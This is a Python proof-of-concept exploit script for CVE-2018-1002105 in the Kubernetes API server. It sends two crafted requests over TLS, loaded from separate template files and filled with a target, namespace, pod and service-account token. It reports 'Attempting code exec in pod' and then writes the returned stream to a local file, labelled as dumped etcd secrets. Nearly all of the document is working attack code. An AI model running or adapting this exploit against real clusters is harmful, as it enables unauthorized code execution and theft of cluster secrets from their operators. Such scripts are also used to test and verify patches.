#!/usr/bin/env python3
import argparse
from ssl import wrap_socket
from socket import create_connection
from secrets import base64, token_bytes


def request_stage_1(namespace, pod, target, token):

    stage_1 = ""

    with open('stage_1', 'r') as stage_1_fd:
        stage_1 = stage_1_fd.read()

    return stage_1.format(namespace, pod, target,
                          token).encode('utf-8')


def request_stage_2(target):

    stage_2 = ""

    with open('stage_2', 'r') as stage_2_fd:
        stage_2 = stage_2_fd.read()

    key = base64.b64encode(token_bytes(20)).decode('utf-8')

    return stage_2.format(target, key).encode('utf-8')


def run_exploit(target, stage_1, stage_2):

    host, port = target.split(':')

    with create_connection((host, port)) as sock:

        with wrap_socket(sock) as ssock:
            print('[*] Building pipe...')
            ssock.send(stage_1)

            if b'400 Bad Request' in ssock.recv(4096):
                print('[+] Pipe opened :D')

            else:
                print('[-] Not sure if this went well...')

            print('[*] Attempting code exec in pod')
            ssock.send(stage_2)

            if b'HTTP/1.1 101 Switching Protocols' not in ssock.recv(4096):
                print('[-] Exploit failed :(')

                return False

            filename = 'etcd.db'
            print(f"[*] Dumping secrets in {filename} ....")
            data_incoming = True

            with open(filename, 'wb+') as fd:
                while data_incoming:
                    data = ssock.recv(4096)
                    fd.write(data)

                    if not data:
                        print('[+] Done dumping secrets!')
                        data_incoming = False


def main():

    parser = argparse.ArgumentParser(description='PoC for CVE-2018-1002105.')
    parser.add_argument('--target', '-t', dest='target', type=str,
                        help='API server target:port', required=True)
    parser.add_argument('--jwt', '-j', dest='token', type=str,
                        help='JWT token for service account')
    parser.add_argument('--namespace', '-n', dest='namespace', type=str,
                        help='Namespace with exec access', default='default')
    parser.add_argument('--pod', '-p', dest='pod', type=str,
                        required=True, help='Pod with exec access')

    args = parser.parse_args()

    if args.target.find(':') == -1:
        print(f"[-] invalid target {args.target}")
        return False

    stage1 = request_stage_1(args.namespace, args.pod, args.target, args.token)
    stage2 = request_stage_2(args.target)

    run_exploit(args.target, stage1, stage2)


if __name__ == '__main__':
    main()
